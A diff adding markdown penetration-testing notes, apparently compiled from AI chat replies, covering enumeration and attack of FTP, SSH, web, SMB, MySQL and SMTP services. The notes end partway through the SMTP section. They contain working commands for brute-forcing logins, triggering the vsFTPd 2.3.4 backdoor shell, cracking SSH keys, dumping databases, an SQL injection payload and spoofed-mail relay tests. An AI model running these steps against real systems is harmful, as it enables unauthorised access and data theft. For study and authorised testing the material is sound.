@@ -1,0 +1,1479 @@
+PORTS SCANNING AND HACKING
+
+
+
+| Priority | Port    | Service                      | Why Important?                                              |
+| :------- | :------ | :--------------------------- | :---------------------------------------------------------- |
+| 1️⃣      | 21      | FTP (File Transfer Protocol) | File transfer, often anonymous login or vulnerable services |
+| 2️⃣      | 22      | SSH (Secure Shell)           | Secure remote access, often weak creds                      |
+| 3️⃣      | 80/443  | HTTP/HTTPS                   | Web servers, major attack surface                           |
+| 4️⃣      | 139/445 | SMB (File sharing)           | Windows file shares, common vulns                           |
+| 5️⃣      | 3306    | MySQL                        | Database service, SQLi, default creds                       |
+| 6️⃣      | 3389    | RDP (Remote Desktop)         | Windows remote access, brute force                          |
+| 7️⃣      | 25      | SMTP (Email)                 | Email server, relay attacks                                 |
+| 8️⃣      | 53      | DNS                          | Zone transfers, DNS hijacking                               |
+
+
+---
+
+1️⃣ 📝 FTP (Port 21) Full Notes
+
+---
+
+## 🔍 **What is FTP?**
+
+* **FTP (File Transfer Protocol)** runs on **Port 21 (TCP)**.
+* Used for **file transfer** between client and server.
+* Common **services**:
+
+  * **vsFTPd** (Very Secure FTP Daemon)
+  * **ProFTPd**
+  * **Pure-FTPd**
+
+---
+
+## 🧭 **FTP Enumeration: Step-by-Step**
+
+### 1️⃣ **Check if Port 21 is Open**
+
+```bash
+nmap -p 21 <target-ip>
+```
+
+---
+
+### 2️⃣ **Banner Grabbing: Get FTP Version**
+
+#### With Netcat:
+
+```bash
+nc -nv <target-ip> 21
+```
+
+#### With Telnet:
+
+```bash
+telnet <target-ip> 21
+```
+
+#### Sample Output:
+
+```
+220 (vsFTPd 2.3.4)
+```
+
+---
+
+### 3️⃣ **Check for Anonymous Login**
+
+```bash
+ftp <target-ip>
+```
+
+Login as:
+
+```
+Username: anonymous
+Password: (blank or use 'anonymous')
+```
+
+✅ If **successful**, you can browse/download/upload files.
+
+---
+
+### 4️⃣ **List Files and Directories**
+
+```bash
+ls -al
+pwd
+```
+
+Look for:
+
+* Config files
+* Hidden files (start with `.`)
+* Backup files (`.bak`, `.old`)
+
+---
+
+### 5️⃣ **Test Upload & Download**
+
+Upload a test file:
+
+```bash
+put test.txt
+```
+
+Download a file:
+
+```bash
+get <filename>
+```
+
+---
+
+### 6️⃣ **Brute Force FTP Credentials**
+
+Use **Hydra**:
+
+```bash
+hydra -l <username> -P /usr/share/wordlists/rockyou.txt ftp://<target-ip>
+```
+
+---
+
+### 7️⃣ **Nmap FTP NSE Scripts**
+
+Run Nmap scripts to automate checks:
+
+```bash
+nmap -p21 --script ftp* <target-ip>
+```
+
+Useful Scripts:
+
+| Script                | Description                      |
+| --------------------- | -------------------------------- |
+| `ftp-anon`            | Checks for anonymous access      |
+| `ftp-brute`           | Brute-forces FTP credentials     |
+| `ftp-syst`            | Grabs system info                |
+| `ftp-vsftpd-backdoor` | Checks for vsFTPd 2.3.4 backdoor |
+
+---
+
+### 8️⃣ **Search for Vulnerabilities (Manual)**
+
+Use **SearchSploit**:
+
+```bash
+searchsploit <service> <version>
+```
+
+Example:
+
+```bash
+searchsploit vsFTPd 2.3.4
+```
+
+Search Online:
+
+```bash
+<service> <version> vulnerabilities
+```
+
+Example:
+
+```
+vsFTPd 2.3.4 CVE
+```
+
+---
+
+### 9️⃣ **Known FTP Vulnerabilities (Examples)**
+
+| Service   | Version   | CVE/Exploit                       |
+| --------- | --------- | --------------------------------- |
+| vsFTPd    | 2.3.4     | CVE-2011-2523 (Backdoor)          |
+| ProFTPd   | mod\_copy | File Copy Vulnerability           |
+| Pure-FTPd | <1.0.22   | Remote Code Execution (RCE)       |
+| General   | Any       | Clear-text credentials, misconfig |
+
+---
+
+## 💥 **vsFTPd 2.3.4 Exploitation Example**
+
+1️⃣ Banner shows:
+
+```
+220 (vsFTPd 2.3.4)
+```
+
+2️⃣ Exploit:
+
+* Connect with `:)` username:
+
+```bash
+nc -nv <target-ip> 21
+```
+
+Send:
+
+```
+USER :)
+PASS whatever
+```
+
+3️⃣ If backdoor is active, a shell opens on port 6200:
+
+```bash
+nc -nv <target-ip> 6200
+```
+
+---
+
+## 🎯 FTP Enumeration & Exploitation: Final Checklist
+
+✅ Check if port 21 is open
+✅ Grab the banner (server & version)
+✅ Check for anonymous access
+✅ List files & directories
+✅ Check upload/download permissions
+✅ Look for vulnerabilities in service version
+✅ Run brute-force attacks if needed
+✅ Exploit known vulnerabilities
+
+---
+
+## 📂 Tools Summary
+
+| Tool            | Purpose                            | Example                                |
+| --------------- | ---------------------------------- | -------------------------------------- |
+| `nc` / `telnet` | Banner grabbing                    | `nc -nv <ip> 21`                       |
+| `ftp`           | Connect & interact with FTP server | `ftp <ip>`                             |
+| `nmap`          | Port scan & script scan            | `nmap -p21 --script ftp* <ip>`         |
+| `searchsploit`  | Search exploits                    | `searchsploit vsftpd 2.3.4`            |
+| `hydra`         | Brute-force credentials            | `hydra -l user -P wordlist ftp://<ip>` |
+
+
+
+
+
+
+Absolutely! Let’s go **deep into SSH (Secure Shell)** enumeration and exploitation. 🚀
+
+---
+
+# 📝 **SSH (Port 22) Full Notes**
+
+---
+
+## 🌐 **What is SSH?**
+
+* **SSH (Secure Shell)** is a **remote login protocol** for secure communication.
+* Default port: **22 (TCP)**
+* Replaces **Telnet**, **rlogin**, and **FTP** for secure operations.
+* Common implementations:
+
+  * **OpenSSH** (most common)
+  * **Dropbear** (lightweight SSH)
+  * **libssh** (library, often in embedded devices)
+
+---
+
+## 🔍 **SSH Enumeration: Step-by-Step**
+
+### 1️⃣ **Check if Port 22 is Open**
+
+```bash
+nmap -p 22 <target-ip>
+```
+
+---
+
+### 2️⃣ **Banner Grabbing: SSH Version**
+
+#### With Netcat:
+
+```bash
+nc -nv <target-ip> 22
+```
+
+#### Sample Output:
+
+```
+SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8
+```
+
+---
+
+### 3️⃣ **Nmap SSH Scripts**
+
+Run Nmap scripts for automated checks:
+
+```bash
+nmap -p22 --script ssh* <target-ip>
+```
+
+Useful scripts:
+
+| Script             | Purpose                                |
+| ------------------ | -------------------------------------- |
+| `ssh-hostkey`      | Grabs SSH public key fingerprint       |
+| `ssh2-enum-algos`  | Lists supported encryption algorithms  |
+| `ssh-auth-methods` | Lists supported authentication methods |
+| `ssh-brute`        | Brute-force attack on SSH              |
+
+---
+
+### 4️⃣ **Check SSH Algorithms (Crypto Analysis)**
+
+```bash
+nmap --script ssh2-enum-algos -p22 <target-ip>
+```
+
+Look for:
+✅ Weak ciphers
+✅ Weak key exchange algorithms
+✅ Outdated versions
+
+---
+
+### 5️⃣ **Brute-Force SSH Credentials**
+
+✅ **Hydra (Fast & Popular):**
+
+```bash
+hydra -l <username> -P /usr/share/wordlists/rockyou.txt ssh://<target-ip>
+```
+
+✅ **Ncrack (Alternative):**
+
+```bash
+ncrack -p 22 -U users.txt -P passwords.txt <target-ip>
+```
+
+✅ **Patator (More control):**
+
+```bash
+patator ssh_login host=<target-ip> user=root password=FILE0 0=rockyou.txt
+```
+
+---
+
+### 6️⃣ **SSH Key-Based Authentication**
+
+✅ Check if you can find private keys (`id_rsa`, `.ssh` files) in:
+
+* FTP/HTTP/Shares/Backup files
+* Git repos / Config leaks
+
+✅ If found, try logging in:
+
+```bash
+ssh -i id_rsa <user>@<target-ip>
+```
+
+✅ If key is **password-protected**, crack it:
+
+```bash
+ssh2john id_rsa > hash.txt
+john hash.txt --wordlist=rockyou.txt
+```
+
+---
+
+### 7️⃣ **Known SSH Vulnerabilities (Examples)**
+
+| Service | Version            | CVE / Exploit                                   |
+| ------- | ------------------ | ----------------------------------------------- |
+| OpenSSH | 7.2p2              | CVE-2016-10009 (Use-After-Free)                 |
+| OpenSSH | <7.4               | User Enumeration (timing attack)                |
+| libssh  | 0.6-0.8.3          | CVE-2018-10933 (Auth bypass, no password)       |
+| OpenSSH | Any (if misconfig) | Weak algorithms, default creds, brute-forceable |
+
+✅ Use:
+
+```bash
+searchsploit <service> <version>
+```
+
+Example:
+
+```bash
+searchsploit OpenSSH 7.2
+```
+
+---
+
+### 8️⃣ **SSH Enumeration Final Checklist**
+
+✅ Port 22 open
+✅ Banner/Version grabbed
+✅ Weak crypto algorithms checked
+✅ Brute-force credentials tried
+✅ Look for SSH private keys
+✅ Search for version-specific CVEs
+✅ Check SSH misconfigurations
+
+---
+
+## 🔓 **SSH Misconfigurations to Check**
+
+| Misconfiguration    | Impact                                      |
+| ------------------- | ------------------------------------------- |
+| Root login allowed  | Direct root access                          |
+| Weak passwords      | Brute-forcible                              |
+| Outdated algorithms | Easier crypto attacks                       |
+| Default creds       | Use common usernames like root, admin, test |
+| Weak keys           | Small key sizes or leaked private keys      |
+
+---
+
+## 🛠️ **SSH Tools Summary**
+
+| Tool       | Purpose                       | Example                                                              |
+| ---------- | ----------------------------- | -------------------------------------------------------------------- |
+| `nc`       | Banner grab                   | `nc -nv <ip> 22`                                                     |
+| `nmap`     | Port scan, scripts            | `nmap -p22 --script ssh* <ip>`                                       |
+| `hydra`    | Brute-force attack            | `hydra -l user -P wordlist ssh://<ip>`                               |
+| `ncrack`   | Brute-force attack            | `ncrack -p22 -U users.txt -P passwords.txt <ip>`                     |
+| `patator`  | Brute-force attack            | `patator ssh_login host=<ip> user=root password=FILE0 0=rockyou.txt` |
+| `ssh`      | SSH client                    | `ssh user@<ip>`                                                      |
+| `ssh2john` | Convert key for cracking      | `ssh2john id_rsa > hash.txt`                                         |
+| `john`     | Crack private key passphrases | `john hash.txt --wordlist=rockyou.txt`                               |
+
+---
+
+Let me know if you want an **SSH attack flowchart** or a **PDF version** of these notes! 🚀
+Ready for **HTTP/HTTPS (80/443)** next? Let’s go! 🌐🔥
+
+
+
+
+
+
+Let’s go **deep into HTTP/HTTPS (Port 80/443)**, Karthik! 🚀
+
+---
+
+3️⃣ 📝 **HTTP/HTTPS (Port 80/443) Full Notes**
+
+---
+
+## 🌐 **What is HTTP/HTTPS?**
+
+| Protocol | Port | Purpose                               |
+| -------- | ---- | ------------------------------------- |
+| HTTP     | 80   | Unencrypted web communication         |
+| HTTPS    | 443  | Encrypted (SSL/TLS) web communication |
+
+✅ HTTP = Hypertext Transfer Protocol
+✅ HTTPS = Secure version using SSL/TLS encryption
+
+---
+
+## 🔍 **HTTP/HTTPS Enumeration: Step-by-Step**
+
+---
+
+### 1️⃣ **Check Open Ports (Basic)**
+
+```bash
+nmap -p 80,443 <target-ip>
+```
+
+---
+
+### 2️⃣ **Service Version Detection**
+
+```bash
+nmap -sV -p80,443 <target-ip>
+```
+
+Look for:
+✅ Apache, nginx, IIS versions
+✅ PHP, ASP.NET, or other backend technologies
+
+---
+
+### 3️⃣ **HTTP Enumeration with Nmap Scripts**
+
+```bash
+nmap -p80,443 --script http* <target-ip>
+```
+
+🔥 Useful Scripts:
+
+| Script                  | Purpose                                    |
+| ----------------------- | ------------------------------------------ |
+| http-title              | Page title                                 |
+| http-headers            | HTTP headers info                          |
+| http-methods            | Allowed HTTP methods (GET/POST/PUT/DELETE) |
+| http-enum               | Directory enumeration                      |
+| http-vuln-cve2021-41773 | Apache Path Traversal vuln check           |
+| http-robots.txt         | Looks for disallowed directories           |
+| http-php-version        | Detect PHP version                         |
+| http-server-header      | Grab server banner                         |
+
+---
+
+### 4️⃣ **Manual Enumeration in Browser**
+
+✅ Visit:
+
+```
+http://<target-ip>
+https://<target-ip>
+```
+
+Look for:
+✅ Website content, directories, login pages, API endpoints
+✅ CMS (WordPress, Joomla, Drupal, etc.)
+
+---
+
+### 5️⃣ **Directory and File Brute-Forcing**
+
+✅ Use **Gobuster**:
+
+```bash
+gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt
+```
+
+✅ Or **FFUF**:
+
+```bash
+ffuf -u http://<target-ip>/FUZZ -w /usr/share/wordlists/dirb/common.txt
+```
+
+✅ Or **Dirsearch**:
+
+```bash
+python3 dirsearch.py -u http://<target-ip> -e php,html,txt
+```
+
+---
+
+### 6️⃣ **Check Allowed HTTP Methods**
+
+```bash
+curl -X OPTIONS http://<target-ip> -v
+```
+
+Look for dangerous methods:
+✅ PUT (can upload files)
+✅ DELETE (can delete files)
+✅ TRACE/CONNECT
+
+---
+
+### 7️⃣ **Check SSL/TLS Security (For HTTPS)**
+
+✅ **SSLScan**:
+
+```bash
+sslscan <target-ip>
+```
+
+✅ **testssl.sh**:
+
+```bash
+./testssl.sh <target-ip>
+```
+
+✅ Look for:
+✅ Weak SSL/TLS versions (SSLv2/SSLv3, TLS 1.0/1.1)
+✅ Self-signed certificates
+✅ Certificate information (Common Name, expiration, etc.)
+
+---
+
+### 8️⃣ **CMS Detection**
+
+✅ **WhatWeb**:
+
+```bash
+whatweb <target-ip>
+```
+
+✅ **Wappalyzer (Browser Extension)**
+
+✅ **wpscan (for WordPress)**:
+
+```bash
+wpscan --url http://<target-ip> --enumerate u
+```
+
+✅ **droopescan (for Drupal)**:
+
+```bash
+droopescan scan drupal -u http://<target-ip>
+```
+
+---
+
+### 9️⃣ **Vulnerability Scanning**
+
+✅ **Nikto** (quick and dirty):
+
+```bash
+nikto -h http://<target-ip>
+```
+
+✅ **Nuclei**:
+
+```bash
+nuclei -u http://<target-ip> -t vulnerabilities/
+```
+
+✅ **SearchSploit**:
+Find known exploits:
+
+```bash
+searchsploit <web server version>
+```
+
+---
+
+### 🔓 **Common HTTP/HTTPS Vulnerabilities to Check**
+
+| Vulnerability Type         | Example                                    |
+| -------------------------- | ------------------------------------------ |
+| Directory Listing Enabled  | `http://<ip>/files/` lists sensitive files |
+| Sensitive Files Exposed    | `.git/`, `.env`, `.htaccess`, `backup.zip` |
+| Outdated Web Server        | Apache/2.2.8 (old), Nginx 1.4.6 (old)      |
+| Weak SSL/TLS Configuration | SSLv3, TLS 1.0, weak ciphers               |
+| Insecure HTTP Methods      | PUT/DELETE/TRACE                           |
+| CMS Vulns (WordPress, etc) | Outdated plugins, themes                   |
+| Login Pages Found          | `admin`, `login`, `wp-admin`               |
+| Brute-force Usernames/PWDs | Hydra, Burp Suite Intruder                 |
+
+---
+
+### 🛠️ **HTTP/HTTPS Tools Summary**
+
+| Tool       | Purpose                      | Example                               |
+| ---------- | ---------------------------- | ------------------------------------- |
+| Nmap       | Port scanning & NSE scripts  | `nmap -p80,443 --script http* <ip>`   |
+| Gobuster   | Directory brute-force        | `gobuster dir -u <url> -w <wordlist>` |
+| FFUF       | Directory brute-force (fast) | `ffuf -u <url>/FUZZ -w <wordlist>`    |
+| Curl       | HTTP requests & methods      | `curl -X OPTIONS <url> -v`            |
+| WhatWeb    | CMS/Tech detection           | `whatweb <url>`                       |
+| Nikto      | Web vulnerability scanner    | `nikto -h <url>`                      |
+| SSLScan    | SSL/TLS info                 | `sslscan <ip>`                        |
+| testssl.sh | SSL/TLS analysis             | `testssl.sh <ip>`                     |
+| Wpscan     | WordPress scanner            | `wpscan --url <url>`                  |
+| Nuclei     | Web vulnerability scanner    | `nuclei -u <url>`                     |
+
+---
+
+### 🔥 **Final Checklist for HTTP/HTTPS**
+
+✅ Port open
+✅ Server banner/version detected
+✅ Directory brute-force done
+✅ SSL/TLS analyzed (for 443)
+✅ CMS detected
+✅ Web technologies fingerprinted
+✅ HTTP methods checked
+✅ Vulns identified
+✅ Sensitive files found
+✅ Login/admin pages found
+✅ Wordlists prepared for brute-forcing
+
+---
+
+Shall we go to **SMB (Port 139/445)** next? 🏴‍☠️
+Let me know if you want a PDF or a **flowchart for web enumeration**! 🌐🔥
+
+
+
+
+
+Absolutely, Karthik! Let’s **crack SMB (Port 139/445)** in full detail now! 🏴‍☠️
+
+---
+
+# 📝 **SMB (Port 139/445) Full Notes**
+
+---
+
+## 📌 **What is SMB?**
+
+| Protocol | Ports    | Purpose                                    |
+| -------- | -------- | ------------------------------------------ |
+| SMB      | 139, 445 | Windows file sharing, printer sharing, IPC |
+| NetBIOS  | 137-139  | Older Windows file sharing support         |
+
+✅ **SMB (Server Message Block)** allows:
+
+* File and printer sharing
+* Remote system administration
+* IPC (Inter-Process Communication)
+
+---
+
+## 🔍 **SMB Enumeration Step-by-Step**
+
+---
+
+### 1️⃣ **Check Open Ports**
+
+```bash
+nmap -p 139,445 <target-ip>
+```
+
+---
+
+### 2️⃣ **Nmap SMB Scripts (🔥)**
+
+```bash
+nmap --script smb* -p139,445 <target-ip>
+```
+
+Useful scripts:
+
+| Script             | Purpose                              |
+| ------------------ | ------------------------------------ |
+| smb-os-discovery   | Detect OS, hostname, and domain      |
+| smb-enum-shares    | List shared folders (shares)         |
+| smb-enum-users     | List user accounts                   |
+| smb-enum-groups    | List groups                          |
+| smb-enum-domains   | List domains                         |
+| smb-enum-sessions  | Active sessions                      |
+| smb-enum-processes | Running processes                    |
+| smb-vuln-ms17-010  | Check for EternalBlue vulnerability  |
+| smb-security-mode  | Security level (authentication info) |
+| smb-protocols      | SMB version info (v1, v2, v3)        |
+| smb2-security-mode | SMBv2 security mode                  |
+| smb2-capabilities  | SMBv2 capabilities                   |
+
+Example:
+
+```bash
+nmap -p445 --script smb-os-discovery,smb-enum-shares,smb-enum-users <ip>
+```
+
+---
+
+### 3️⃣ **Enum4Linux (🔥)**
+
+✅ Tool for SMB info gathering:
+
+```bash
+enum4linux <target-ip>
+```
+
+Or detailed:
+
+```bash
+enum4linux -a <target-ip>
+```
+
+🔎 What you get:
+✅ OS info
+✅ Domain/Workgroup
+✅ Users
+✅ Groups
+✅ Shares
+✅ Password policy
+✅ RID brute-forcing
+
+---
+
+### 4️⃣ **SMBClient - Access Shares**
+
+```bash
+smbclient -L //<target-ip>
+```
+
+Anonymous login:
+
+```bash
+smbclient -L //<target-ip> -N
+```
+
+Or with credentials:
+
+```bash
+smbclient -L //<target-ip> -U <username>
+```
+
+Access a share:
+
+```bash
+smbclient //<target-ip>/<share-name> -N
+```
+
+Example:
+
+```bash
+smbclient //10.10.10.10/secret -N
+```
+
+Browse files:
+
+```bash
+ls
+cd <folder>
+get <file>
+```
+
+---
+
+### 5️⃣ **CrackMapExec (🔥)**
+
+```bash
+crackmapexec smb <ip> --shares
+crackmapexec smb <ip> --users
+crackmapexec smb <ip> --sessions
+```
+
+With creds:
+
+```bash
+crackmapexec smb <ip> -u <user> -p <password>
+```
+
+---
+
+### 6️⃣ **SMB Vulnerability Checks**
+
+| Vuln                     | Tool/Script                    | Command                                          |
+| ------------------------ | ------------------------------ | ------------------------------------------------ |
+| EternalBlue (MS17-010)   | `nmap` or `smb-vuln-ms17-010`  | `nmap -p445 --script smb-vuln-ms17-010 <ip>`     |
+| SMBGhost (CVE-2020-0796) | `nmap`/`smb-vuln-cve2020-0796` | `nmap -p445 --script smb-vuln-cve2020-0796 <ip>` |
+| SMBv1 (Deprecated)       | `nmap`/`smb-protocols`         | `nmap -p445 --script smb-protocols <ip>`         |
+
+---
+
+### 7️⃣ **RID Brute-Forcing**
+
+Guess users by RID:
+
+```bash
+enum4linux -U <ip>
+```
+
+Or use **crackmapexec**:
+
+```bash
+crackmapexec smb <ip> --users
+```
+
+---
+
+### 8️⃣ **Common SMB Vulns to Check**
+
+| Vulnerability            | Details                                       |
+| ------------------------ | --------------------------------------------- |
+| Anonymous Access         | Access shares without credentials             |
+| Null Sessions            | Access via no auth (`smbclient -N`)           |
+| Weak Credentials         | Guessable passwords for users                 |
+| SMBv1 Enabled            | Outdated, vulnerable to EternalBlue, WannaCry |
+| EternalBlue (MS17-010)   | Remote code execution                         |
+| SMBGhost (CVE-2020-0796) | Remote code execution in SMBv3                |
+| Sensitive Shares         | Backup, Admin\$, IPC\$, etc.                  |
+| Exposed Config Files     | `smb.conf`, backups, `.bak` files             |
+
+---
+
+## 🚀 **Quick Commands Reference**
+
+| Command                          | Purpose                             |
+| -------------------------------- | ----------------------------------- |
+| `nmap -p139,445 <ip>`            | Check open ports                    |
+| `nmap --script smb* -p445 <ip>`  | SMB enumeration                     |
+| `enum4linux -a <ip>`             | Full SMB info                       |
+| `smbclient -L //<ip> -N`         | List shares (anon)                  |
+| `smbclient //<ip>/<share> -N`    | Access share (anon)                 |
+| `crackmapexec smb <ip> --shares` | List shares                         |
+| `nmap --script smb-vuln* <ip>`   | Vuln detection (MS17-010, SMBGhost) |
+
+---
+
+## 🛡️ **Mitigations for SMB Vulns**
+
+| Risk               | Fix                                          |
+| ------------------ | -------------------------------------------- |
+| SMBv1 Enabled      | Disable SMBv1                                |
+| Weak Passwords     | Enforce strong password policy               |
+| Anonymous Access   | Disable null sessions                        |
+| Unnecessary Shares | Remove/lock down unused shares               |
+| Patches Missing    | Update Windows for SMB vulns (MS17-010, etc) |
+
+---
+
+
+
+
+
+
+
+Absolutely! Let’s **crack MySQL (Port 3306)** now, step-by-step, with **practical tools, commands, and vulnerabilities**. 🚀
+
+---
+
+# 📝 **MySQL (Port 3306) Full Notes**
+
+---
+
+## 📌 **What is MySQL?**
+
+| Port | Service | Why Important?                                            |
+| ---- | ------- | --------------------------------------------------------- |
+| 3306 | MySQL   | Popular open-source database; vulnerable if misconfigured |
+
+✅ MySQL is used for **databases** in web apps like WordPress, PHPMyAdmin, etc.
+✅ **Exploitation targets**:
+
+* Weak/default credentials
+* SQL injection
+* Misconfigurations (remote access)
+
+---
+
+## 🔍 **Step-by-Step MySQL Enumeration & Exploitation**
+
+---
+
+### 1️⃣ **Check Open Port**
+
+```bash
+nmap -p3306 <target-ip>
+```
+
+---
+
+### 2️⃣ **Nmap MySQL Scripts**
+
+```bash
+nmap --script mysql* -p3306 <target-ip>
+```
+
+Useful scripts:
+
+| Script                  | Purpose                             |
+| ----------------------- | ----------------------------------- |
+| mysql-info              | Get MySQL version & banner info     |
+| mysql-users             | Enumerate MySQL users               |
+| mysql-empty-password    | Check for empty password accounts   |
+| mysql-databases         | List databases (needs creds)        |
+| mysql-brute             | Bruteforce MySQL login              |
+| mysql-vuln-cve2012-2122 | CVE-2012-2122 authentication bypass |
+
+Example:
+
+```bash
+nmap -p3306 --script mysql-info,mysql-users,mysql-empty-password <ip>
+```
+
+---
+
+### 3️⃣ **Banner Grabbing**
+
+```bash
+nc <ip> 3306
+```
+
+You might get:
+
+```
+5.7.32-0ubuntu0.18.04.1
+```
+
+✅ Note version for known vulnerabilities!
+
+---
+
+### 4️⃣ **MySQL Default/Weak Credentials**
+
+Try default creds:
+
+| Username | Password                  |
+| -------- | ------------------------- |
+| root     | root / password / (empty) |
+| admin    | admin                     |
+
+Try login:
+
+```bash
+mysql -h <target-ip> -u root -p
+```
+
+If no password:
+
+```bash
+mysql -h <target-ip> -u root
+```
+
+---
+
+### 5️⃣ **Brute Force MySQL (Hydra)**
+
+```bash
+hydra -L users.txt -P passwords.txt mysql://<target-ip>
+```
+
+Or:
+
+```bash
+hydra -s 3306 -V -L users.txt -P passwords.txt <ip> mysql
+```
+
+---
+
+### 6️⃣ **Access MySQL If Credentials Work**
+
+Login:
+
+```bash
+mysql -h <ip> -u <user> -p
+```
+
+Check DBs:
+
+```sql
+SHOW DATABASES;
+```
+
+Switch DB:
+
+```sql
+USE <db>;
+```
+
+List tables:
+
+```sql
+SHOW TABLES;
+```
+
+Dump data:
+
+```sql
+SELECT * FROM <table>;
+```
+
+---
+
+### 7️⃣ **Database Dump (if creds found)**
+
+```bash
+mysqldump -h <ip> -u <user> -p <db> > dump.sql
+```
+
+---
+
+### 8️⃣ **Exploiting SQL Injection (If Web App Exposed)**
+
+✅ Check web apps connected to MySQL:
+
+* Look for **SQLi vulnerabilities**.
+* Use tools like **SQLmap**:
+
+```bash
+sqlmap -u <url> --dbs
+```
+
+✅ Example SQLi payload:
+
+```sql
+' OR 1=1--
+```
+
+---
+
+### 9️⃣ **Known Vulnerabilities**
+
+| CVE                     | Vulnerability                            | Notes                              |
+| ----------------------- | ---------------------------------------- | ---------------------------------- |
+| CVE-2012-2122           | Auth bypass via password overflow        | Login as root without password     |
+| CVE-2016-6662/6663/6664 | Remote code execution (my.cnf injection) | File-based privilege escalation    |
+| CVE-2019-2614           | Insecure data validation                 | Auth bypass in some MySQL versions |
+| Misconfig               | Remote connections with weak passwords   | Allowing `bind_address=0.0.0.0`    |
+
+---
+
+### 1️⃣0️⃣ **MySQL Misconfigurations to Check**
+
+| Misconfig              | Impact                                       |
+| ---------------------- | -------------------------------------------- |
+| `bind-address=0.0.0.0` | MySQL accessible from any IP (not localhost) |
+| Weak passwords         | Brute-forcible                               |
+| Anonymous users        | Unauthenticated access possible              |
+| Unpatched version      | Vulnerable to exploits                       |
+
+---
+
+### 1️⃣1️⃣ **Tools for MySQL Exploitation**
+
+| Tool           | Usage                                  |
+| -------------- | -------------------------------------- |
+| **Hydra**      | Brute-force MySQL logins               |
+| **SQLmap**     | SQLi exploitation (web)                |
+| **Nmap**       | Scripts: mysql-info, mysql-users, etc. |
+| **Metasploit** | MySQL login modules, exploit modules   |
+
+---
+
+### 🚀 **Quick Commands Recap**
+
+| Task                | Command Example                                    |
+| ------------------- | -------------------------------------------------- |
+| Port Scan           | `nmap -p3306 <ip>`                                 |
+| Banner Grab         | `nc <ip> 3306`                                     |
+| Nmap Scripts        | `nmap -p3306 --script mysql* <ip>`                 |
+| MySQL Login         | `mysql -h <ip> -u root -p`                         |
+| Brute-force (Hydra) | `hydra -L users.txt -P passwords.txt mysql://<ip>` |
+| List DBs            | `SHOW DATABASES;`                                  |
+| Dump DB             | `mysqldump -h <ip> -u user -p db > dump.sql`       |
+| SQLi Exploit (Web)  | `sqlmap -u <url> --dbs`                            |
+
+---
+
+## 🛡️ **Mitigations for MySQL Vulns**
+
+| Risk                   | Fix                                           |
+| ---------------------- | --------------------------------------------- |
+| Weak Passwords         | Use strong passwords, disable anonymous users |
+| Exposed Port (0.0.0.0) | Bind to localhost if not needed externally    |
+| SQLi Vulnerabilities   | Validate user inputs, use prepared statements |
+| Unpatched MySQL        | Update MySQL to the latest version            |
+
+---
+
+
+
+
+
+
+
+Got it! Here’s your detailed, practical, and easy-to-follow **SMTP (Port 25) full notes** for pentesting and enumeration:
+
+---
+
+# 📝 **SMTP (Port 25) Full Notes**
+
+---
+
+## 📌 **What is SMTP?**
+
+| Port | Service | Why Important?                                                               |
+| ---- | ------- | ---------------------------------------------------------------------------- |
+| 25   | SMTP    | Email sending protocol; target for spam, relay attacks, and credential theft |
+
+SMTP (Simple Mail Transfer Protocol) is the standard protocol for sending email between servers. It’s a popular attack surface because misconfigured SMTP servers can be abused for spam relay, phishing, or user enumeration.
+
+---
+
+## 🔍 **SMTP Enumeration & Exploitation**
+
+---
+
+### 1️⃣ **Check if SMTP Port is Open**
+
+```bash
+nmap -p 25 <target-ip>
+```
+
+---
+
+### 2️⃣ **Banner Grabbing**
+
+Connect with Netcat:
+
+```bash
+nc <target-ip> 25
+```
+
+You’ll see something like:
+
+```
+220 mail.example.com ESMTP Postfix
+```
+
+This gives the mail server name, software, and version (which may have known vulnerabilities).
+
+---
+
+### 3️⃣ **Basic SMTP Commands to Interact**
+
+After connecting with `nc`, try:
+
+```
+EHLO attacker.com
+MAIL FROM:<attacker@attacker.com>
+RCPT TO:<victim@example.com>
+DATA
+Subject: Test Mail
+
+This is a test message.
+.
+QUIT
+```
+
+If accepted, it means you can send emails through the server.
+
+---
+
+### 4️⃣ **Check for Open Relay**
+
+An **Open Relay** SMTP server allows sending emails to any address (often abused by spammers).
+
+Test Open Relay:
+
+```bash
+nc <target-ip> 25
+```
+
+Then enter:
+
+```
+EHLO attacker.com
+MAIL FROM:<attacker@attacker.com>
+RCPT TO:<victim@victim.com>
+```
+
+If the server allows `RCPT TO` for external domains, it’s an open relay.
+
+---
+
+### 5️⃣ **Enumerate Users (VRFY and EXPN)**
+
+Check if the server reveals valid email accounts:
+
+```bash
+VRFY username
+```
+
+or
+
+```bash
+EXPN username
+```
+
+Example:
+
+```bash
+VRFY admin
+```
+
+If it responds with user details, user enumeration is possible.
+
+---
+
+### 6️⃣ **Brute Force SMTP Authentication**
+
+If the SMTP server requires auth (usually port 587 or 465), you can brute force usernames and passwords with Hydra:
+
+```bash
+hydra -s 25 -V -L users.txt -P passwords.txt -t 4 smtp://<target-ip>
+```
+
+---
+
+### 7️⃣ **Sending Emails via SMTP with Authentication**
+
+Using tools like `swaks` (SMTP command-line client):
+
+```bash
+swaks --to victim@example.com --from attacker@attacker.com --server <target-ip> --auth LOGIN --auth-user <user> --auth-password <pass>
+```
+
+---
+
+### 8️⃣ **Common Vulnerabilities in SMTP Servers**
+
+| Vulnerability     | Description                                   |
+| ----------------- | --------------------------------------------- |
+| Open Relay        | Allows sending spam emails through the server |
+| User Enumeration  | VRFY/EXPN commands reveal valid users         |
+| Weak Auth         | Brute force login due to weak credentials     |
+| Misconfigured TLS | No encryption or weak TLS ciphers             |
+| Spoofing          | No SPF/DKIM records lead to email spoofing    |
+
+---
+
+### 9️⃣ **Tools for SMTP Testing**
+
+| Tool               | Purpose                         |
+| ------------------ | ------------------------------- |
+| **Nmap**           | SMTP script scans               |
+| **Netcat**         | Manual SMTP interaction         |
+| **Hydra**          | SMTP authentication brute-force |
+| **Swaks**          | SMTP testing & sending mails    |
+| **smtp-user-enum** | Automated user enumeration      |
+
+Example Nmap scripts for SMTP:
+
+```bash
+nmap -p 25 --script smtp-enum-users,smtp-commands,smtp-open-relay <ip>
+```
+
+---
+
+### 🚀 **Quick Commands Recap**
+
+| Task                    | Command Example                                         |
+| ----------------------- | ------------------------------------------------------- |
+| Port scan               | `nmap -p 25 <ip>`                                       |
+| Banner grab             | `nc <ip> 25`                                            |
+| Open relay test         | Use `MAIL FROM` and `RCPT TO` commands                  |
+| User enumeration        | `VRFY username` or `EXPN username`                      |
+| Auth brute force        | `hydra -s 25 -L users.txt -P passwords.txt smtp://<ip>` |
